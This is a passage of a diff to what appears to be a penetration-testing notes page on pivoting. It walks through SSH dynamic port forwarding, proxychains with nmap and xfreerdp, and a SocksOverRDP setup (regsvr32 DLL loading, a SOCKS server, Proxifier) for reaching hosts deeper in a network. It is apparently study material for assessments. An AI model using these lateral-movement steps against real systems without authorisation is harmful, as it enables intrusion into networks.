-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="gp"># </span>First,<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>Dynamic<span class="w"> </span>Port<span class="w"> </span>Forwarding<span class="w"> </span>over<span class="w"> </span>SSH
-</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a><span class="go">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span>
-</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a>
-</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a><span class="gp"># </span>Now<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>use<span class="w"> </span>proxychains<span class="w"> </span>with<span class="w"> </span>nmap
-</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a><span class="go">proxychains nmap -sV -sT 172.16.5.19 -p3389</span>
-</span></code></pre></div>
-<ul>
-<li>OR  use proxychains with RDP to connect to the machine in the other network range:</li>
 </ul>
 <div class="language-shell-session highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="gp"># </span>First,<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>Dynamic<span class="w"> </span>Port<span class="w"> </span>Forwarding<span class="w"> </span>over<span class="w"> </span>SSH
 </span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a><span class="go">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span>
 </span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>
 </span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a><span class="gp"># </span>Now<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>use<span class="w"> </span>proxychains<span class="w"> </span>with<span class="w"> </span>nmap
-</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a><span class="go">proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19</span>
+</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a><span class="go">proxychains nmap -sV -sT 172.16.5.19 -p3389</span>
+</span></code></pre></div>
+<ul>
+<li>OR  use proxychains with RDP to connect to the machine in the other network range:</li>
+</ul>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="gp"># </span>First,<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>Dynamic<span class="w"> </span>Port<span class="w"> </span>Forwarding<span class="w"> </span>over<span class="w"> </span>SSH
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="go">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span>
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>
+</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a><span class="gp"># </span>Now<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>use<span class="w"> </span>proxychains<span class="w"> </span>with<span class="w"> </span>nmap
+</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a><span class="go">proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19</span>
 </span></code></pre></div>
 <h3 id="rdp-and-socks-tunneling-with-socksoverrdp">RDP and SOCKS Tunneling with SocksOverRDP</h3>
 <p>There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. <a href="https://github.com/nccgroup/SocksOverRDP">SocksOverRDP</a> is an example of a tool that uses <code>Dynamic Virtual Channels</code> (<code>DVC</code>) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use <code>SocksOverRDP</code> to tunnel our custom packets and then proxy through it. We will use the tool <a href="https://www.proxifier.com/">Proxifier</a> as our proxy server.</p>
@@ -17458,7 +17465,7 @@ Attacked machine 2:
 <p><strong>2.</strong> <strong>Attacking machine 1</strong></p>
 <p>Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.</p>
 <p>From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. <strong>Do it as Admin</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>regsvr32.exe SocksOverRDP-Plugin.dll
+<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>regsvr32.exe SocksOverRDP-Plugin.dll
 </span></code></pre></div>
 <p><strong>3.</strong> <strong>Attacking machine 2</strong></p>
 <p>Now, from the machine 1, we can connect to machine 2  over RDP using <code>mstsc.exe</code>. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.</p>
@@ -17466,17 +17473,17 @@ Attacked machine 2:
 <p>Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.</p>
 <p>When done, <strong>start SocksOverRDP-Server.exe with Admin privileges</strong> in machine 2.</p>
 <p>When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>netstat -antb | findstr 1080
+<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>netstat -antb | findstr 1080
 </span></code></pre></div>
 <p>Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>Open proxifier and go to Profile &gt; Proxy server. Click on &quot;Add...&quot;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>Open proxifier and go to Profile &gt; Proxy server. Click on &quot;Add...&quot;
 </span></code></pre></div>
 <p>With Proxifier configured and running, we can <strong>start mstsc.exe</strong>, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.</p>
 <p>So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-11-08T23:55:46+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-11-08</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-11-09T21:58:30+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-11-09</span></small></br>
 
 
     <small>Created: November 5, 2024 21:44:57</small>
